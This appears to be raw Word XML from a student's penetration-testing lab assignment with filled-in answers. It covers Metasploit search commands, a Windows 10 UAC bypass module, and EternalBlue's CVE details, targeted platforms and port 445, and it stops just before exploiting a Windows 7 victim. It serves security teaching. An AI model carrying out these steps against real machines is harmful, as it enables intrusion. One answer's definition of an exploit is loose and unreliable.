          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Disable SMBv3 compression</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522A6F5A" w14:textId="77777777" w:rsidR="008A31F4" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0160425A" w14:textId="77777777" w:rsidR="0001541A" w:rsidRDefault="0001541A" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05682721" w14:textId="2A248507" w:rsidR="00172FE1" w:rsidRDefault="0001541A" w:rsidP="00862684">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Select </w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t>latest vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="00172FE1">
        <w:t xml:space="preserve"> (CVE)</w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:r w:rsidR="008A31F4" w:rsidRPr="000C41DB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/usr/share/metasploit-framework/data/exploits</w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t>. Use respective</w:t>
      </w:r>
      <w:r w:rsidR="00172FE1">
        <w:t xml:space="preserve"> database to search details about the vulnerability you selected and </w:t>
      </w:r>
      <w:r w:rsidR="00B166C3">
        <w:t>provide a short description,</w:t>
      </w:r>
      <w:r w:rsidR="000C41DB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t>severity,</w:t>
      </w:r>
      <w:r w:rsidR="00B166C3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t>weakness and mitigations or</w:t>
      </w:r>
      <w:r w:rsidR="00D25EAF">
        <w:t>/and</w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t xml:space="preserve"> workaround</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56102A7E" w14:textId="04BDA716" w:rsidR="002277F8" w:rsidRDefault="002277F8" w:rsidP="002277F8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002277F8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Sudo contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABFA538" w14:textId="6E0B83C1" w:rsidR="00C62044" w:rsidRDefault="00C62044" w:rsidP="002277F8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>7.8 HIGH severity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACA7DC5" w14:textId="7AD85C23" w:rsidR="00C62044" w:rsidRDefault="00C62044" w:rsidP="002277F8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CWE-193</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5953A60C" w14:textId="77777777" w:rsidR="00C62044" w:rsidRPr="002277F8" w:rsidRDefault="00C62044" w:rsidP="002277F8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06C60895" w14:textId="77777777" w:rsidR="00204DCA" w:rsidRDefault="00204DCA" w:rsidP="00172FE1"/>
    <w:p w14:paraId="2380B2D2" w14:textId="3FC682A7" w:rsidR="004F561B" w:rsidRDefault="00855A09" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Start metasplo</w:t>
      </w:r>
      <w:r w:rsidR="00A74113">
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t console </w:t>
      </w:r>
      <w:r w:rsidR="002A5879">
        <w:t xml:space="preserve">by typing </w:t>
      </w:r>
      <w:r w:rsidR="008906C3">
        <w:t xml:space="preserve">the command </w:t>
      </w:r>
      <w:r w:rsidR="002A5879">
        <w:t>#</w:t>
      </w:r>
      <w:r w:rsidR="004F561B" w:rsidRPr="002A5879">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:r w:rsidR="008906C3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DF0283" w14:textId="04056806" w:rsidR="001A641A" w:rsidRPr="0001541A" w:rsidRDefault="000C49DA" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5</w:t>
      </w:r>
      <w:r w:rsidRPr="001539E2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E13AAC">
        <w:t>Access</w:t>
      </w:r>
      <w:r w:rsidR="00855A09">
        <w:t xml:space="preserve"> the following </w:t>
      </w:r>
      <w:r w:rsidR="0001541A">
        <w:t xml:space="preserve">web </w:t>
      </w:r>
      <w:r w:rsidR="00855A09">
        <w:t>site</w:t>
      </w:r>
      <w:r w:rsidR="008906C3">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidR="008906C3" w:rsidRPr="00F643EF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008906C3">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00855A09">
        <w:t>to learn basic</w:t>
      </w:r>
      <w:r w:rsidR="00B63A4D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008906C3">
        <w:t xml:space="preserve">metasploit </w:t>
      </w:r>
      <w:r w:rsidR="00B63A4D">
        <w:t>commands</w:t>
      </w:r>
      <w:r w:rsidR="005C722C">
        <w:t xml:space="preserve"> such as: </w:t>
      </w:r>
      <w:r w:rsidR="005C722C" w:rsidRPr="0001541A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>search, use, show, s</w:t>
      </w:r>
      <w:r w:rsidRPr="0001541A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>et, info.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8BFE87" w14:textId="7A0F7B8A" w:rsidR="00BA10F1" w:rsidRDefault="00F15B47" w:rsidP="000C49DA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Type the command</w:t>
      </w:r>
      <w:r w:rsidR="003D0843">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">: search –help </w:t>
      </w:r>
      <w:r w:rsidR="003D0843" w:rsidRPr="003D0843">
        <w:t>to learn options that can be used with this command</w:t>
      </w:r>
      <w:r w:rsidR="003D0843">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003D0843">
        <w:t xml:space="preserve"> Type </w:t>
      </w:r>
      <w:r w:rsidR="003D0843" w:rsidRPr="003D0843">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>search uac</w:t>
      </w:r>
      <w:r w:rsidR="003D0843">
        <w:t xml:space="preserve"> T</w:t>
      </w:r>
      <w:r>
        <w:t>o display exploit that bypass UAC( Local Privilege Escalation)</w:t>
      </w:r>
      <w:r w:rsidR="003D0843">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA05286" w14:textId="1CBA7A4F" w:rsidR="008906C3" w:rsidRDefault="003D0843" w:rsidP="00BA10F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">What is the latest Windows 10 UAC exploit? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F2F427" w14:textId="32BC6651" w:rsidR="00710990" w:rsidRPr="00710990" w:rsidRDefault="00710990" w:rsidP="00710990">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidRPr="00710990">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>indows 10 UAC Protection Bypass Via Windows Store</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00710990">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>(WSReset.exe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47881C3B" w14:textId="27BEF581" w:rsidR="00BA10F1" w:rsidRDefault="00BA10F1" w:rsidP="00BA10F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What </w:t>
      </w:r>
      <w:r w:rsidR="00650FEE">
        <w:t xml:space="preserve">Metasploits </w:t>
      </w:r>
      <w:r>
        <w:t>search option will display 2020 exploits for Windows 10?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DD2044" w14:textId="3D50FA94" w:rsidR="00C403DB" w:rsidRPr="00C403DB" w:rsidRDefault="00C403DB" w:rsidP="00C403DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C403DB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>search windows 10 date:2020</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6159726C" w14:textId="1C4E0234" w:rsidR="00111EFD" w:rsidRDefault="00F15B47" w:rsidP="000C49DA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use the command </w:t>
      </w:r>
      <w:r w:rsidRPr="00E370F0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>show exploits</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to display exploits. Use show command to display payloads and nops</w:t>
      </w:r>
      <w:r w:rsidR="007438EC">
        <w:t>. What is the difference between exploit and payload?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B754D6" w14:textId="4C59B54F" w:rsidR="000B6B2B" w:rsidRPr="000B6B2B" w:rsidRDefault="000B6B2B" w:rsidP="000B6B2B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">An exploit is </w:t>
      </w:r>
      <w:r w:rsidR="002E49B4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>a vulnerability that an attacker uses, a payload is what said attacker puts in the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211E989A" w14:textId="6738C037" w:rsidR="007D24C7" w:rsidRDefault="000F62B0" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(15</w:t>
      </w:r>
      <w:r w:rsidRPr="000F62B0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003D62AB" w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="00BB67C5" w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>xploit Windows-7 64</w:t>
      </w:r>
      <w:r w:rsidR="00BB67C5">
        <w:t xml:space="preserve"> bits </w:t>
      </w:r>
      <w:r w:rsidR="00786272">
        <w:t xml:space="preserve">machine by </w:t>
      </w:r>
      <w:r w:rsidR="007D24C7">
        <w:t>using one of existing exploits</w:t>
      </w:r>
      <w:r w:rsidR="00786272">
        <w:t xml:space="preserve"> as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A18B3B0" w14:textId="1EB8B849" w:rsidR="00621663" w:rsidRDefault="00621663" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Access and read about </w:t>
      </w:r>
      <w:r w:rsidR="0091341E">
        <w:t xml:space="preserve">eternalblue exploit </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r w:rsidRPr="00D827DA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00123EC6">
        <w:t xml:space="preserve"> verify CVE references and use it with NVD and provide</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCCE6A3" w14:textId="0B1E3F09" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Brief description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2264FDAF" w14:textId="7700B149" w:rsidR="00597A3B" w:rsidRPr="00597A3B" w:rsidRDefault="00597A3B" w:rsidP="00597A3B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00597A3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>allows remote attackers to execute arbitrary code via crafted packets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F827D6C" w14:textId="65C77E34" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Severity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3141887A" w14:textId="6DB703DD" w:rsidR="007D4226" w:rsidRPr="007D4226" w:rsidRDefault="007D4226" w:rsidP="007D4226">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>8.1 HIGH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264E0703" w14:textId="12B64686" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Weakness Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BC3807" w14:textId="25A48463" w:rsidR="007D4226" w:rsidRPr="007D4226" w:rsidRDefault="007D4226" w:rsidP="007D4226">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CWE-20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C89517C" w14:textId="77777777" w:rsidR="0091341E" w:rsidRDefault="0091341E" w:rsidP="0091341E"/>
    <w:p w14:paraId="7E60FF7D" w14:textId="752CD986" w:rsidR="008D00B4" w:rsidRDefault="00123EC6" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>To verify exploit’s modules u</w:t>
      </w:r>
      <w:r w:rsidR="008D00B4">
        <w:t xml:space="preserve">se the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Exploit Database </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidRPr="006839D4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.exploit-db.com/exploits/41891</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidRPr="006839D4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.exploit-db.com/exploits/42315</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FCB4874" w14:textId="5B5F7FC5" w:rsidR="00200F8A" w:rsidRDefault="00200F8A" w:rsidP="00200F8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In which platforms was this exploit tested?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1856E00A" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2016 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DD9B6D" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 10 Pro Build 10240 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA07C7C" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2012 R2 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D4A3BA" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 8.1 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2699C1A8" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2008 R2 SP1 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A70E83" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 7 SP1 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE4B88A" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2008 SP1 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63887733" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2003 R2 SP2 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0551BD1E" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows XP SP2 x64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD0D65B" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 8.1 x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BC2C37" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 7 SP1 x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF8F494" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2008 SP1 x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCB86E4" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2003 SP2 x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E02AA59" w14:textId="77777777" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows XP SP3 x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B59F40" w14:textId="574E0A26" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D74373">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Windows 2000 SP4 x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602C9B66" w14:textId="67E82A45" w:rsidR="00200F8A" w:rsidRDefault="00200F8A" w:rsidP="00200F8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What port was used in this exploit?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AA8A6F" w14:textId="2C3E858D" w:rsidR="00D74373" w:rsidRPr="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>TCP port 445</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA125FF" w14:textId="75964025" w:rsidR="00200F8A" w:rsidRDefault="00200F8A" w:rsidP="00200F8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use nmap to verify if this port is open in Windows 7 (victim machine)</w:t>
      </w:r>
    </w:p>
